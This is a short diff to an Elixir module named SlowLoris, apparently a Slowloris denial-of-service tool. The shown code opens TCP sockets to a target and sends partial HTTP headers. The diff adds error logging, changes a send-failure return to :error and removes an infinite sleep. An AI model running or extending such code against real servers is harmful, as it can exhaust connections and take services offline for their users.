@@ -6,7 +6,8 @@ defmodule SlowLoris do
         :gen_tcp.send(socket, "GET / HTTP/1.1\r\n")
         :gen_tcp.send(socket, "Host: #{target}\r\n")
         socket
-      {:error, _} ->
+      {:error, reason} ->
+        Logger.info("#{inspect(self())} - #{reason}")
         :error
     end
   end
@@ -16,9 +17,7 @@ defmodule SlowLoris do
       :ok -> :ok
       {:error, reason} ->
         Logger.info("#{inspect(self())} - #{reason}")
-        :ok
+        :error
     end
   end
 end
-
-:timer.sleep(:infinity)
